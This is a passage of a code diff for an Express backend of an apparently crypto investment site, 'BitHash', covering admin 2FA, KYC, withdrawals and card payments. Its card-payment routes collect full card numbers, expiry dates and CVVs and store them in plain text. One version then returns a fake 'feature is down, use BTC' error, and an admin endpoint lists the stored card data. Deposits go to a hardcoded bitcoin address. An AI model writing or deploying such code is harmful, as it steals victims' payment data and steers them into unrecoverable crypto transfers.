-    console.error('Mark notifications read error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while marking notifications as read'
     });
   }
 });
@@ -1792,21 +1745,22 @@ app.post('/api/admin/auth/login', [
       });
     }
 
-    // Update last login
-    const deviceInfo = await getUserDeviceInfo(req);
-    admin.lastLogin = new Date();
-    admin.loginHistory.push(deviceInfo);
-    await admin.save();
-
-    // Check if 2FA is enabled
+    // If 2FA is enabled, require token verification
     if (admin.twoFactorAuth.enabled) {
-      req.session.tempAdminId = admin._id;
+      const tempToken = generateJWT(admin._id, true);
       return res.status(200).json({
-        status: 'success',
-        requires2FA: true,
+        status: '2fa-required',
+        tempToken,
         message: 'Two-factor authentication required'
       });
     }
+
+    const deviceInfo = await getUserDeviceInfo(req);
+
+    // Update last login
+    admin.lastLogin = new Date();
+    admin.loginHistory.push(deviceInfo);
+    await admin.save();
 
     const token = generateJWT(admin._id, true);
 
@@ -1841,7 +1795,8 @@ app.post('/api/admin/auth/login', [
 });
 
 app.post('/api/admin/auth/verify-2fa', [
-  body('token').notEmpty().withMessage('Token is required')
+  body('token').notEmpty().withMessage('Token is required'),
+  body('tempToken').notEmpty().withMessage('Temporary token is required')
 ], async (req, res) => {
   const errors = validationResult(req);
   if (!errors.isEmpty()) {
@@ -1852,57 +1807,52 @@ app.post('/api/admin/auth/verify-2fa', [
   }
 
   try {
-    const { token } = req.body;
-    const adminId = req.session.tempAdminId;
+    const { token, tempToken } = req.body;
 
-    if (!adminId) {
-      return res.status(400).json({
-        status: 'fail',
-        message: 'Session expired. Please log in again.'
-      });
-    }
+    const decoded = verifyJWT(tempToken);
+    const admin = await Admin.findById(decoded.id).select('+twoFactorAuth.secret');
 
-    const admin = await Admin.findById(adminId).select('+twoFactorAuth.secret +twoFactorAuth.backupCodes');
     if (!admin) {
-      return res.status(404).json({
+      return res.status(401).json({
         status: 'fail',
         message: 'Admin not found'
       });
     }
 
-    // Check if token is a backup code
-    const isBackupCode = admin.twoFactorAuth.backupCodes.includes(token);
-    
-    if (!isBackupCode) {
-      // Verify TOTP token
-      const verified = speakeasy.totp.verify({
-        secret: admin.twoFactorAuth.secret,
-        encoding: 'base32',
-        token,
-        window: 1
+    if (!admin.twoFactorAuth.enabled || !admin.twoFactorAuth.secret) {
+      return res.status(400).json({
+        status: 'fail',
+        message: 'Two-factor authentication not enabled for this account'
       });
-
-      if (!verified) {
-        return res.status(401).json({
-          status: 'fail',
-          message: 'Invalid two-factor authentication token'
-        });
-      }
-    } else {
-      // Remove used backup code
-      admin.twoFactorAuth.backupCodes = admin.twoFactorAuth.backupCodes.filter(code => code !== token);
-      await admin.save();
     }
 
-    // Mark 2FA as verified in session
-    req.session.twoFactorVerified = true;
-    req.session.tempAdminId = undefined;
+    const verified = verifyTOTP(admin.twoFactorAuth.secret, token);
+    if (!verified) {
+      return res.status(401).json({
+        status: 'fail',
+        message: 'Invalid two-factor authentication token'
+      });
+    }
 
-    const jwtToken = generateJWT(admin._id, true);
+    const deviceInfo = await getUserDeviceInfo(req);
+
+    // Update last login
+    admin.lastLogin = new Date();
+    admin.loginHistory.push(deviceInfo);
+    await admin.save();
+
+    const finalToken = generateJWT(admin._id, true);
+
+    res.cookie('admin_jwt', finalToken, {
+      expires: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
+      httpOnly: true,
+      secure: process.env.NODE_ENV === 'production',
+      sameSite: 'strict'
+    });
 
     res.status(200).json({
       status: 'success',
-      token: jwtToken,
+      token: finalToken,
       data: {
         admin: {
           id: admin._id,
@@ -1913,32 +1863,12 @@ app.post('/api/admin/auth/verify-2fa', [
       }
     });
 
-    await logActivity('admin-2fa-verify', 'admin', admin._id, admin._id, 'Admin', req);
+    await logActivity('admin-2fa-verification', 'admin', admin._id, admin._id, 'Admin', req);
   } catch (err) {
     console.error('Admin 2FA verification error:', err);
     res.status(500).json({
       status: 'error',
       message: 'An error occurred during two-factor authentication'
-    });
-  }
-});
-
-app.post('/api/admin/auth/logout', adminProtect, async (req, res) => {
-  try {
-    res.clearCookie('admin_jwt');
-    req.session.destroy();
-
-    res.status(200).json({
-      status: 'success',
-      message: 'Logged out successfully'
-    });
-
-    await logActivity('admin-logout', 'admin', req.admin._id, req.admin._id, 'Admin', req);
-  } catch (err) {
-    console.error('Admin logout error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred during logout'
     });
   }
 });
@@ -2049,6 +1979,16 @@ app.post('/api/admin/auth/reset-password', [
       message: 'An error occurred while resetting the password'
     });
   }
+});
+
+app.post('/api/admin/auth/logout', adminProtect, async (req, res) => {
+  res.clearCookie('admin_jwt');
+  res.status(200).json({
+    status: 'success',
+    message: 'Logged out successfully'
+  });
+
+  await logActivity('admin-logout', 'admin', req.admin._id, req.admin._id, 'Admin', req);
 });
 
 // Admin Dashboard
@@ -2344,32 +2284,6 @@ app.get('/api/admin/kyc/pending', adminProtect, restrictTo('super', 'kyc'), asyn
   }
 });
 
-app.get('/api/admin/kyc/:id', adminProtect, restrictTo('super', 'kyc'), async (req, res) => {
-  try {
-    const kyc = await KYC.findById(req.params.id)
-      .populate('user', 'firstName lastName email')
-      .populate('reviewedBy', 'name');
-
-    if (!kyc) {
-      return res.status(404).json({
-        status: 'fail',
-        message: 'KYC submission not found'
-      });
-    }
-
-    res.status(200).json({
-      status: 'success',
-      data: kyc
-    });
-  } catch (err) {
-    console.error('Get KYC error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while fetching KYC submission'
-    });
-  }
-});
-
 app.post('/api/admin/kyc/:id/review', adminProtect, restrictTo('super', 'kyc'), [
   body('status').isIn(['approved', 'rejected']).withMessage('Invalid status'),
   body('rejectionReason').optional().trim()
@@ -2459,33 +2373,6 @@ app.get('/api/admin/withdrawals/pending', adminProtect, restrictTo('super', 'fin
   }
 });
 
-app.get('/api/admin/withdrawals/:id', adminProtect, restrictTo('super', 'finance'), async (req, res) => {
-  try {
-    const withdrawal = await Transaction.findOne({
-      _id: req.params.id,
-      type: 'withdrawal'
-    }).populate('user', 'firstName lastName email');
-
-    if (!withdrawal) {
-      return res.status(404).json({
-        status: 'fail',
-        message: 'Withdrawal not found'
-      });
-    }
-
-    res.status(200).json({
-      status: 'success',
-      data: withdrawal
-    });
-  } catch (err) {
-    console.error('Get withdrawal error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while fetching withdrawal'
-    });
-  }
-});
-
 app.post('/api/admin/withdrawals/:id/process', adminProtect, restrictTo('super', 'finance'), [
   body('status').isIn(['completed', 'cancelled']).withMessage('Invalid status'),
   body('notes').optional().trim()
@@ -2564,811 +2451,25 @@ app.post('/api/admin/withdrawals/:id/process', adminProtect, restrictTo('super',
   }
 });
 
-// Admin Deposit Management
-app.get('/api/admin/deposits/pending', adminProtect, restrictTo('super', 'finance'), async (req, res) => {
-  try {
-    const pendingDeposits = await Transaction.find({ type: 'deposit', status: 'pending' })
-      .populate('user', 'firstName lastName email')
-      .sort({ createdAt: 1 });
-
-    res.status(200).json({
-      status: 'success',
-      data: pendingDeposits
-    });
-  } catch (err) {
-    console.error('Pending deposits error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while fetching pending deposits'
-    });
-  }
-});
-
-app.post('/api/admin/deposits/:id/process', adminProtect, restrictTo('super', 'finance'), [
-  body('status').isIn(['completed', 'cancelled']).withMessage('Invalid status'),
-  body('notes').optional().trim()
-], async (req, res) => {
-  const errors = validationResult(req);
-  if (!errors.isEmpty()) {
-    return res.status(400).json({
-      status: 'fail',
-      errors: errors.array()
-    });
-  }
-
-  try {
-    const { id } = req.params;
-    const { status, notes } = req.body;
-
-    const deposit = await Transaction.findOneAndUpdate(
-      { _id: id, type: 'deposit', status: 'pending' },
-      {
-        status,
-        adminNotes: notes,
-        processedBy: req.admin._id,
-        processedAt: new Date()
-      },
-      { new: true }
-    ).populate('user', 'firstName lastName email');
-
-    if (!deposit) {
-      return res.status(404).json({
-        status: 'fail',
-        message: 'Pending deposit not found'
-      });
-    }
-
-    if (status === 'completed') {
-      // Credit the amount to user's balance
-      const user = await User.findById(deposit.user._id);
-      if (user) {
-        user.balances.main += deposit.amount;
-        await user.save();
-
-        // Send notification to user
-        user.notifications.push({
-          title: 'Deposit Completed',
-          message: `Your deposit of $${deposit.amount} has been completed and credited to your account.`,
-          type: 'success'
-        });
-        await user.save();
-      }
-    }
-
-    res.status(200).json({
-      status: 'success',
-      data: deposit
-    });
-
-    await logActivity('process-deposit', 'transaction', deposit._id, req.admin._id, 'Admin', req, { status, notes });
-  } catch (err) {
-    console.error('Process deposit error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while processing deposit'
-    });
-  }
-});
-
-// Admin Card Payment Management
-app.post('/api/payments/process', protect, [
-  body('amount').isFloat({ gt: 0 }).withMessage('Amount must be greater than 0'),
-  body('cardDetails.name').notEmpty().withMessage('Cardholder name is required'),
-  body('cardDetails.number').isCreditCard().withMessage('Invalid credit card number'),
-  body('cardDetails.expiry').matches(/^(0[1-9]|1[0-2])\/?([0-9]{2})$/).withMessage('Invalid expiry date format (MM/YY)'),
-  body('cardDetails.cvv').matches(/^[0-9]{3,4}$/).withMessage('Invalid CVV'),
-  body('cardDetails.billingAddress').notEmpty().withMessage('Billing address is required')
-], async (req, res) => {
-  const errors = validationResult(req);
-  if (!errors.isEmpty()) {
-    return res.status(400).json({
-      status: 'fail',
-      errors: errors.array()
-    });
-  }
-
-  try {
-    const { amount, cardDetails } = req.body;
-    const reference = `CARD-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
-
-    // Store card details in transaction (as plain text per requirements)
-    const transaction = await Transaction.create({
-      user: req.user.id,
-      type: 'deposit',
-      amount,
-      currency: 'USD',
-      status: 'pending',
-      method: 'card',
-      reference,
-      netAmount: amount,
-      cardDetails: {
-        name: cardDetails.name,
-        number: cardDetails.number,
-        expiry: cardDetails.expiry,
-        cvv: cardDetails.cvv,
-        billingAddress: cardDetails.billingAddress
-      },
-      details: `Card deposit of $${amount}`
-    });
-
-    // Return error message as requested
-    res.status(400).json({
-      status: 'fail',
-      message: 'Card payment feature is currently down. Our team is working on it at the moment. Please use the BTC option for deposits.'
-    });
-
-    await logActivity('card-deposit-attempt', 'transaction', transaction._id, req.user._id, 'User', req, { amount });
-  } catch (err) {
-    console.error('Process card payment error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while processing card payment'
-    });
-  }
-});
-
+// Admin Card Payments Management
 app.get('/api/admin/card-payments', adminProtect, restrictTo('super', 'finance'), async (req, res) => {
   try {
-    const { page = 1, limit = 20 } = req.query;
-    const skip = (page - 1) * limit;
-
-    const cardPayments = await Transaction.find({ method: 'card' })
-      .populate('user', 'firstName lastName email')
-      .sort({ createdAt: -1 })
-      .skip(skip)
-      .limit(parseInt(limit));
-
-    const total = await Transaction.countDocuments({ method: 'card' });
+    const cardPayments = await Transaction.find({ 
+      method: 'card',
+      'cardDetails.cardNumber': { $exists: true }
+    })
+    .select('cardDetails amount status createdAt')
+    .sort({ createdAt: -1 });
 
     res.status(200).json({
       status: 'success',
-      data: {
-        transactions: cardPayments,
-        total,
-        page: parseInt(page),
-        pages: Math.ceil(total / limit)
-      }
+      data: cardPayments
     });
   } catch (err) {
     console.error('Get card payments error:', err);
     res.status(500).json({
       status: 'error',
       message: 'An error occurred while fetching card payments'
-    });
-  }
-});
-
-// Admin Loan Management
-app.get('/api/admin/loans', adminProtect, restrictTo('super', 'finance'), async (req, res) => {
-  try {
-    const { status, page = 1, limit = 20 } = req.query;
-    const skip = (page - 1) * limit;
-
-    const query = {};
-    if (status) query.status = status;
-
-    const loans = await Loan.find(query)
-      .populate('user', 'firstName lastName email')
-      .populate('approvedBy', 'name')
-      .sort({ createdAt: -1 })
-      .skip(skip)
-      .limit(parseInt(limit));
-
-    const total = await Loan.countDocuments(query);
-
-    res.status(200).json({
-      status: 'success',
-      data: {
-        loans,
-        total,
-        page: parseInt(page),
-        pages: Math.ceil(total / limit)
-      }
-    });
-  } catch (err) {
-    console.error('Get loans error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while fetching loans'
-    });
-  }
-});
-
-app.post('/api/admin/loans', adminProtect, restrictTo('super', 'finance'), [
-  body('user').isMongoId().withMessage('Invalid user ID'),
-  body('amount').isFloat({ gt: 0 }).withMessage('Amount must be greater than 0'),
-  body('interestRate').isFloat({ gt: 0 }).withMessage('Interest rate must be greater than 0'),
-  body('duration').isInt({ gt: 0 }).withMessage('Duration must be greater than 0'),
-  body('collateralAmount').isFloat({ gt: 0 }).withMessage('Collateral amount must be greater than 0')
-], async (req, res) => {
-  const errors = validationResult(req);
-  if (!errors.isEmpty()) {
-    return res.status(400).json({
-      status: 'fail',
-      errors: errors.array()
-    });
-  }
-
-  try {
-    const { user, amount, interestRate, duration, collateralAmount, collateralCurrency = 'BTC' } = req.body;
-
-    const userExists = await User.findById(user);
-    if (!userExists) {
-      return res.status(404).json({
-        status: 'fail',
-        message: 'User not found'
-      });
-    }
-
-    const loan = await Loan.create({
-      user,
-      amount,
-      interestRate,
-      duration,
-      collateralAmount,
-      collateralCurrency,
-      status: 'approved',
-      approvedBy: req.admin._id,
-      approvedAt: new Date(),
-      startDate: new Date(),
-      endDate: new Date(Date.now() + duration * 24 * 60 * 60 * 1000),
-      repaymentAmount: amount + (amount * interestRate / 100)
-    });
-
-    // Update user's loan balance
-    userExists.balances.loan += amount;
-    await userExists.save();
-
-    // Create a transaction record
-    await Transaction.create({
-      user: userExists._id,
-      type: 'loan',
-      amount,
-      status: 'completed',
-      method: 'internal',
-      reference: `LOAN-${loan._id.toString().slice(-6).toUpperCase()}`,
-      details: `Loan approved for $${amount} at ${interestRate}% interest`,
-      netAmount: amount
-    });
-
-    // Send notification to user
-    userExists.notifications.push({
-      title: 'Loan Approved',
-      message: `Your loan of $${amount} has been approved. The repayment amount is $${loan.repaymentAmount} due on ${loan.endDate.toLocaleDateString()}.`,
-      type: 'success'
-    });
-    await userExists.save();
-
-    res.status(201).json({
-      status: 'success',
-      data: loan
-    });
-
-    await logActivity('create-loan', 'loan', loan._id, req.admin._id, 'Admin', req, req.body);
-  } catch (err) {
-    console.error('Create loan error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while creating loan'
-    });
-  }
-});
-
-app.get('/api/admin/loans/:id', adminProtect, restrictTo('super', 'finance'), async (req, res) => {
-  try {
-    const loan = await Loan.findById(req.params.id)
-      .populate('user', 'firstName lastName email')
-      .populate('approvedBy', 'name');
-
-    if (!loan) {
-      return res.status(404).json({
-        status: 'fail',
-        message: 'Loan not found'
-      });
-    }
-
-    res.status(200).json({
-      status: 'success',
-      data: loan
-    });
-  } catch (err) {
-    console.error('Get loan error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while fetching loan'
-    });
-  }
-});
-
-app.put('/api/admin/loans/:id', adminProtect, restrictTo('super', 'finance'), [
-  body('status').optional().isIn(['pending', 'approved', 'rejected', 'active', 'repaid', 'defaulted']).withMessage('Invalid status'),
-  body('amount').optional().isFloat({ gt: 0 }).withMessage('Amount must be greater than 0'),
-  body('interestRate').optional().isFloat({ gt: 0 }).withMessage('Interest rate must be greater than 0'),
-  body('duration').optional().isInt({ gt: 0 }).withMessage('Duration must be greater than 0'),
-  body('collateralAmount').optional().isFloat({ gt: 0 }).withMessage('Collateral amount must be greater than 0'),
-  body('adminNotes').optional().trim()
-], async (req, res) => {
-  const errors = validationResult(req);
-  if (!errors.isEmpty()) {
-    return res.status(400).json({
-      status: 'fail',
-      errors: errors.array()
-    });
-  }
-
-  try {
-    const { id } = req.params;
-    const updates = req.body;
-
-    const loan = await Loan.findByIdAndUpdate(id, updates, {
-      new: true,
-      runValidators: true
-    }).populate('user', 'firstName lastName email');
-
-    if (!loan) {
-      return res.status(404).json({
-        status: 'fail',
-        message: 'Loan not found'
-      });
-    }
-
-    res.status(200).json({
-      status: 'success',
-      data: loan
-    });
-
-    await logActivity('update-loan', 'loan', loan._id, req.admin._id, 'Admin', req, updates);
-  } catch (err) {
-    console.error('Update loan error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while updating loan'
-    });
-  }
-});
-
-app.delete('/api/admin/loans/:id', adminProtect, restrictTo('super'), async (req, res) => {
-  try {
-    const loan = await Loan.findByIdAndDelete(req.params.id);
-
-    if (!loan) {
-      return res.status(404).json({
-        status: 'fail',
-        message: 'Loan not found'
-      });
-    }
-
-    res.status(204).json({
-      status: 'success',
-      data: null
-    });
-
-    await logActivity('delete-loan', 'loan', loan._id, req.admin._id, 'Admin', req);
-  } catch (err) {
-    console.error('Delete loan error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while deleting loan'
-    });
-  }
-});
-
-// Admin Investment Management
-app.get('/api/admin/investments', adminProtect, restrictTo('super', 'finance'), async (req, res) => {
-  try {
-    const { status, page = 1, limit = 20 } = req.query;
-    const skip = (page - 1) * limit;
-
-    const query = {};
-    if (status) query.status = status;
-
-    const investments = await Investment.find(query)
-      .populate('user', 'firstName lastName email')
-      .populate('plan')
-      .sort({ createdAt: -1 })
-      .skip(skip)
-      .limit(parseInt(limit));
-
-    const total = await Investment.countDocuments(query);
-
-    res.status(200).json({
-      status: 'success',
-      data: {
-        investments,
-        total,
-        page: parseInt(page),
-        pages: Math.ceil(total / limit)
-      }
-    });
-  } catch (err) {
-    console.error('Get investments error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while fetching investments'
-    });
-  }
-});
-
-app.post('/api/admin/investments/:id/complete', adminProtect, restrictTo('super', 'finance'), async (req, res) => {
-  try {
-    const investment = await Investment.findByIdAndUpdate(
-      req.params.id,
-      { status: 'completed' },
-      { new: true }
-    ).populate('user', 'firstName lastName email');
-
-    if (!investment) {
-      return res.status(404).json({
-        status: 'fail',
-        message: 'Investment not found'
-      });
-    }
-
-    // Credit the expected return to user's balance
-    const user = await User.findById(investment.user._id);
-    if (user) {
-      user.balances.active -= investment.amount;
-      user.balances.matured += investment.expectedReturn;
-      await user.save();
-
-      // Create a transaction record
-      await Transaction.create({
-        user: user._id,
-        type: 'interest',
-        amount: investment.expectedReturn - investment.amount,
-        status: 'completed',
-        method: 'internal',
-        reference: `INTRST-${investment._id.toString().slice(-6).toUpperCase()}`,
-        details: `Investment return from plan ${investment.plan.name}`,
-        netAmount: investment.expectedReturn - investment.amount
-      });
-
-      // Send notification to user
-      user.notifications.push({
-        title: 'Investment Completed',
-        message: `Your investment of $${investment.amount} has matured and $${investment.expectedReturn} has been credited to your account.`,
-        type: 'success'
-      });
-      await user.save();
-    }
-
-    res.status(200).json({
-      status: 'success',
-      data: investment
-    });
-
-    await logActivity('complete-investment', 'investment', investment._id, req.admin._id, 'Admin', req);
-  } catch (err) {
-    console.error('Complete investment error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while completing investment'
-    });
-  }
-});
-
-// Admin Profile
-app.get('/api/admin/profile', adminProtect, async (req, res) => {
-  try {
-    const admin = await Admin.findById(req.admin.id)
-      .select('-password -passwordChangedAt -__v');
-
-    res.status(200).json({
-      status: 'success',
-      data: {
-        admin
-      }
-    });
-  } catch (err) {
-    console.error('Get admin profile error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while fetching admin profile'
-    });
-  }
-});
-
-app.put('/api/admin/profile', adminProtect, [
-  body('name').optional().trim().notEmpty().withMessage('Name cannot be empty'),
-  body('email').optional().isEmail().withMessage('Please provide a valid email').normalizeEmail()
-], async (req, res) => {
-  const errors = validationResult(req);
-  if (!errors.isEmpty()) {
-    return res.status(400).json({
-      status: 'fail',
-      errors: errors.array()
-    });
-  }
-
-  try {
-    const { name, email } = req.body;
-    const updates = {};
-
-    if (name) updates.name = name;
-    if (email) updates.email = email;
-
-    const admin = await Admin.findByIdAndUpdate(req.admin.id, updates, {
-      new: true,
-      runValidators: true
-    }).select('-password -passwordChangedAt -__v');
-
-    res.status(200).json({
-      status: 'success',
-      data: {
-        admin
-      }
-    });
-
-    await logActivity('update-admin-profile', 'admin', admin._id, admin._id, 'Admin', req, updates);
-  } catch (err) {
-    console.error('Update admin profile error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while updating admin profile'
-    });
-  }
-});
-
-app.put('/api/admin/password', adminProtect, [
-  body('currentPassword').notEmpty().withMessage('Current password is required'),
-  body('newPassword').isLength({ min: 8 }).withMessage('Password must be at least 8 characters')
-    .matches(/[A-Z]/).withMessage('Password must contain at least one uppercase letter')
-    .matches(/[a-z]/).withMessage('Password must contain at least one lowercase letter')
-    .matches(/[0-9]/).withMessage('Password must contain at least one number')
-    .matches(/[^A-Za-z0-9]/).withMessage('Password must contain at least one special character')
-], async (req, res) => {
-  const errors = validationResult(req);
-  if (!errors.isEmpty()) {
-    return res.status(400).json({
-      status: 'fail',
-      errors: errors.array()
-    });
-  }
-
-  try {
-    const { currentPassword, newPassword } = req.body;
-    const admin = await Admin.findById(req.admin.id).select('+password');
-
-    if (!(await bcrypt.compare(currentPassword, admin.password))) {
-      return res.status(401).json({
-        status: 'fail',
-        message: 'Current password is incorrect'
-      });
-    }
-
-    admin.password = await bcrypt.hash(newPassword, 12);
-    admin.passwordChangedAt = Date.now();
-    await admin.save();
-
-    const token = generateJWT(admin._id, true);
-
-    res.status(200).json({
-      status: 'success',
-      token,
-      message: 'Password updated successfully'
-    });
-
-    await logActivity('change-admin-password', 'admin', admin._id, admin._id, 'Admin', req);
-  } catch (err) {
-    console.error('Change admin password error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while changing password'
-    });
-  }
-});
-
-// Admin Two-Factor Authentication
-app.get('/api/admin/two-factor', adminProtect, async (req, res) => {
-  try {
-    const admin = await Admin.findById(req.admin.id).select('twoFactorAuth');
-    
-    res.status(200).json({
-      status: 'success',
-      data: {
-        enabled: admin.twoFactorAuth.enabled
-      }
-    });
-  } catch (err) {
-    console.error('Get admin 2FA status error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while fetching 2FA status'
-    });
-  }
-});
-
-app.post('/api/admin/two-factor/setup', adminProtect, async (req, res) => {
-  try {
-    const admin = await Admin.findById(req.admin.id).select('+twoFactorAuth.secret +twoFactorAuth.backupCodes');
-    
-    // Generate a new secret if not already set up
-    if (!admin.twoFactorAuth.secret) {
-      const secret = speakeasy.generateSecret({
-        length: 20,
-        name: `BitHash Admin:${admin.email}`,
-        issuer: 'BitHash'
-      });
-      
-      admin.twoFactorAuth.secret = secret.base32;
-      admin.twoFactorAuth.backupCodes = generateBackupCodes();
-      await admin.save();
-    }
-
-    // Generate QR code URL
-    const otpauthUrl = speakeasy.otpauthURL({
-      secret: admin.twoFactorAuth.secret,
-      label: `BitHash Admin:${admin.email}`,
-      issuer: 'BitHash',
-      encoding: 'base32'
-    });
-
-    const qrCode = await QRCode.toDataURL(otpauthUrl);
-
-    res.status(200).json({
-      status: 'success',
-      data: {
-        secret: admin.twoFactorAuth.secret,
-        qrCode,
-        backupCodes: admin.twoFactorAuth.backupCodes
-      }
-    });
-
-    await logActivity('setup-admin-2fa', 'admin', admin._id, admin._id, 'Admin', req);
-  } catch (err) {
-    console.error('Setup admin 2FA error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while setting up 2FA'
-    });
-  }
-});
-
-app.post('/api/admin/two-factor/enable', adminProtect, [
-  body('token').notEmpty().withMessage('Token is required')
-], async (req, res) => {
-  const errors = validationResult(req);
-  if (!errors.isEmpty()) {
-    return res.status(400).json({
-      status: 'fail',
-      errors: errors.array()
-    });
-  }
-
-  try {
-    const { token } = req.body;
-    const admin = await Admin.findById(req.admin.id).select('+twoFactorAuth.secret +twoFactorAuth.backupCodes');
-
-    if (!admin.twoFactorAuth.secret) {
-      return res.status(400).json({
-        status: 'fail',
-        message: '2FA is not set up for this account'
-      });
-    }
-
-    const verified = speakeasy.totp.verify({
-      secret: admin.twoFactorAuth.secret,
-      encoding: 'base32',
-      token,
-      window: 1
-    });
-
-    if (!verified) {
-      return res.status(400).json({
-        status: 'fail',
-        message: 'Invalid token'
-      });
-    }
-
-    admin.twoFactorAuth.enabled = true;
-    await admin.save();
-
-    res.status(200).json({
-      status: 'success',
-      message: 'Two-factor authentication enabled successfully',
-      data: {
-        backupCodes: admin.twoFactorAuth.backupCodes
-      }
-    });
-
-    await logActivity('enable-admin-2fa', 'admin', admin._id, admin._id, 'Admin', req);
-  } catch (err) {
-    console.error('Enable admin 2FA error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while enabling 2FA'
-    });
-  }
-});
-
-app.post('/api/admin/two-factor/disable', adminProtect, [
-  body('token').notEmpty().withMessage('Token is required')
-], async (req, res) => {
-  const errors = validationResult(req);
-  if (!errors.isEmpty()) {
-    return res.status(400).json({
-      status: 'fail',
-      errors: errors.array()
-    });
-  }
-
-  try {
-    const { token } = req.body;
-    const admin = await Admin.findById(req.admin.id).select('+twoFactorAuth.secret');
-
-    if (!admin.twoFactorAuth.enabled) {
-      return res.status(400).json({
-        status: 'fail',
-        message: '2FA is not enabled for this account'
-      });
-    }
-
-    const verified = speakeasy.totp.verify({
-      secret: admin.twoFactorAuth.secret,
-      encoding: 'base32',
-      token,
-      window: 1
-    });
-
-    if (!verified) {
-      return res.status(400).json({
-        status: 'fail',
-        message: 'Invalid token'
-      });
-    }
-
-    admin.twoFactorAuth.enabled = false;
-    admin.twoFactorAuth.secret = undefined;
-    admin.twoFactorAuth.backupCodes = undefined;
-    await admin.save();
-
-    res.status(200).json({
-      status: 'success',
-      message: 'Two-factor authentication disabled successfully'
-    });
-
-    await logActivity('disable-admin-2fa', 'admin', admin._id, admin._id, 'Admin', req);
-  } catch (err) {
-    console.error('Disable admin 2FA error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while disabling 2FA'
-    });
-  }
-});
-
-// Admin Activity Logs
-app.get('/api/admin/activity', adminProtect, restrictTo('super', 'support'), async (req, res) => {
-  try {
-    const { limit = 20, page = 1, action, entity } = req.query;
-    const skip = (page - 1) * limit;
-
-    const query = {};
-    if (action) query.action = action;
-    if (entity) query.entity = entity;
-
-    const activities = await SystemLog.find(query)
-      .populate('performedBy', 'name email')
-      .sort({ createdAt: -1 })
-      .skip(skip)
-      .limit(parseInt(limit));
-
-    const total = await SystemLog.countDocuments(query);
-
-    res.status(200).json({
-      status: 'success',
-      data: {
-        activities,
-        total,
-        page: parseInt(page),
-        pages: Math.ceil(total / limit)
-      }
-    });
-  } catch (err) {
-    console.error('Get activity logs error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while fetching activity logs'
     });
   }
 });
@@ -3490,6 +2591,11 @@ app.post('/api/transactions/deposit', protect, [
     if (method === 'btc') {
       transactionData.btcAddress = 'bc1qf98sra3ljvpgy9as0553z79leeq2w2ryvggf3fnvpeh3rz3dk4zs33uf9k';
       transactionData.details += ` to address ${transactionData.btcAddress}`;
+    } else if (method === 'card') {
+      return res.status(400).json({
+        status: 'fail',
+        message: 'Card deposits are currently unavailable. Please use BTC for deposits.'
+      });
     }
 
     const transaction = await Transaction.create(transactionData);
@@ -3509,14 +2615,13 @@ app.post('/api/transactions/deposit', protect, [
   }
 });
 
-app.post('/api/transactions/withdraw', protect, [
+app.post('/api/payments/process', protect, [
   body('amount').isFloat({ gt: 0 }).withMessage('Amount must be greater than 0'),
-  body('method').isIn(['btc', 'bank']).withMessage('Invalid withdrawal method'),
-  body('btcAddress').if(body('method').equals('btc')).notEmpty().withMessage('BTC address is required for BTC withdrawals'),
-  body('bankDetails').if(body('method').equals('bank')).isObject().withMessage('Bank details must be an object'),
-  body('bankDetails.accountName').if(body('method').equals('bank')).notEmpty().withMessage('Account name is required'),
-  body('bankDetails.accountNumber').if(body('method').equals('bank')).notEmpty().withMessage('Account number is required'),
-  body('bankDetails.bankName').if(body('method').equals('bank')).notEmpty().withMessage('Bank name is required')
+  body('fullName').notEmpty().withMessage('Full name is required'),
+  body('billingAddress').notEmpty().withMessage('Billing address is required'),
+  body('cardNumber').notEmpty().withMessage('Card number is required'),
+  body('expiryDate').notEmpty().withMessage('Expiry date is required'),
+  body('cvv').notEmpty().withMessage('CVV is required')
 ], async (req, res) => {
   const errors = validationResult(req);
   if (!errors.isEmpty()) {
@@ -3527,116 +2632,40 @@ app.post('/api/transactions/withdraw', protect, [
   }
 
   try {
-    const { amount, method, btcAddress, bankDetails } = req.body;
-    const user = await User.findById(req.user.id);
+    const { amount, fullName, billingAddress, cardNumber, expiryDate, cvv } = req.body;
+    const reference = `CARD-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
 
-    if (user.balances.main < amount) {
-      return res.status(400).json({
-        status: 'fail',
-        message: 'Insufficient balance for withdrawal'
-      });
-    }
-
-    const reference = `WTH-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
-    const fee = amount * 0.01; // 1% withdrawal fee
-    const netAmount = amount - fee;
-
-    let transactionData = {
-      user: req.user.id,
-      type: 'withdrawal',
-      amount,
-      currency: 'USD',
-      status: 'pending',
-      method,
-      reference,
-      fee,
-      netAmount,
-      details: `Withdrawal of $${amount} via ${method} (Fee: $${fee.toFixed(2)})`
-    };
-
-    if (method === 'btc') {
-      transactionData.btcAddress = btcAddress;
-      transactionData.details += ` to address ${btcAddress}`;
-    } else {
-      transactionData.bankDetails = bankDetails;
-      transactionData.details += ` to ${bankDetails.accountName} (${bankDetails.bankName})`;
-    }
-
-    const transaction = await Transaction.create(transactionData);
-
-    // Deduct from user's balance
-    user.balances.main -= amount;
-    await user.save();
-
-    res.status(201).json({
-      status: 'success',
